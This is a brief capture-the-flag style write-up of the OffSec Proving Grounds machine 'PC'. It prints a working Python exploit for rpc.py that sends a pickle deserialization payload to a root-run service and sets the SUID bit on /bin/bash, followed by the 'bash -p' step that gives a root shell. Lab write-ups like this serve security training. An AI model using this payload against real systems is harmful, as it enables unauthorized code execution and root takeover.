# PC

## Intro

PC is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt syn-ack ttl 61 ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
```

## Root

There is a terminal on http port 8000, I add a ssh key and login with the key.

There is a python script running as root.

```
/opt/rpc.py
```

ExploitDB.

```
https://www.exploit-db.com/exploits/50983
```

Following changes are made to the exploit.

```python
import requests
import pickle

# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py

HOST = "127.0.0.1:65432"

URL = f"http://{HOST}/sayhi"

HEADERS = {
    "serializer": "pickle"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)

    return payload


def exec_command(cmd):

    payload = generate_payload(cmd)

    requests.post(url=URL, data=payload, headers=HEADERS)


def main():
    # exec_command('curl http://127.0.0.1:4321')
    exec_command('/usr/bin/chmod +s /bin/bash')


if __name__ == "__main__":
    main()
```

After running the exploit.

```
bash -p
```
